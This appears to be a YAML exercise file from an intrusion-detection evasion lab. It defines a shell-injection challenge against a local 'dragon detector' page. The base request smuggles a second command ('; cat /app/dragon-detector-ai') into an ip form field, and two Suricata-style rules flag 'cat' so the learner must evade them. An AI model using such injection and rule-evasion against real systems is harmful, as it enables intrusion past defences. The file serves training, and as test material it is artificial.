name: 'Shell Injection (Param) 4'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Print (`cat`) the file `/app/dragon-detector-ai`**.

hints: []

target: detector

base_request: |-
  POST /detect-dragon.php HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 10

  ip=1.2.3.4; cat /app/dragon-detector-ai

rules:
# Don't use cat
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; content: "cat"; sid:123456; rev:1;)
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; http.request_body; content: "cat"; sid:123457; rev:1;)

expected_output: "This doesn't actually do anything"
